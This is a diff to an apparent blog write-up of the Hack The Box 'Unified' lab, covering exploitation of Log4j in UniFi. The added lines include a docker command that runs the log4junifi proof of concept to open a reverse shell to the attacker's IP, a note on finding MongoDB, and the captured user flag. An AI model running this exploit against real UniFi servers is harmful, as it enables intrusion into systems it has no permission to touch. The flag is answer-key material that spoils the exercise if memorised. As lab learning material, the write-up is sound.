@@ -85,11 +85,8 @@ What port do we need to inspect intercepted traffic for?
 **Task 8**  
 What port is the MongoDB service running on?  
 
-Default port is 27017
+Default port is 27017. 
 
-
-**Task 9**  
-What is the default database name for UniFi applications?  
 
 It seems that we want machine access at this point. I tried to capture the traffic in tcpdump and wireshark, but since it's using TLS the data is encrypted. I could spend time setting that up, or the writeup just suggests to use a proxy like burpsuite. I will dive in and try to use burpsuite for the first time. A learning experience! 
 
@@ -104,10 +101,27 @@ In this situation, I will try and use the POC published by `puzzlepeaches`, foun
 
 ... one docker install later ...
 
-docker run -it -v $(pwd)/loot:/Log4jUnifi/loot -p 8090:8090 -p 1389:1389 log4junifi \ 
-    -u https://10.129.36.131:8443 -i 192.168.1.1 -p 4444
+```bash
+kali$ docker run -it -v $(pwd)/loot:/Log4jUnifi/loot -p 8090:8090 -p 1389:1389 log4junifi \ 
+-u https://$TARGET$:8443 -i <my IP> -p 4444
+```
 
-Didn't accomplish too much in this session. Just installing docker and getting up and running with the POC.
+Success! We now have a foothold.
+
+![JNDI exploit success using the log4junifi poc](/public/img/blog/htb-starting-point/unified-jndi-exploit.png)
+
+> Learning opportunity
+> TODO: Research how the exploit works. Beyond just the vulnerable field. The rogue JNDI stuff would be cool to understand
+
+
+Once a reverse shell was obtained, we can run `ps aux | grep "mongo"` to find the db is running on port `27117`. 
+
+
+**Task 9**  
+What is the default database name for UniFi applications?  
+
+Now that we know mongo is running, there should be a cli tool to interact with it. We should be able to determine the available db names, users, etc. as we continue to work through the [article](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi)
+
 
 **Task 10**  
 What is the function we use to enumerate users within the database in MongoDB?  
@@ -123,6 +137,9 @@ What is the password for the root user?
 
 **Task 13**  
 Submit user flag  
+
+Once obtaining a reverse shell in task 9, we find the flag in `/home/michael/user.txt`:  
+`6ced1a6a89e666c0620cdb10262ba127`
 
 
 **Task 14**  
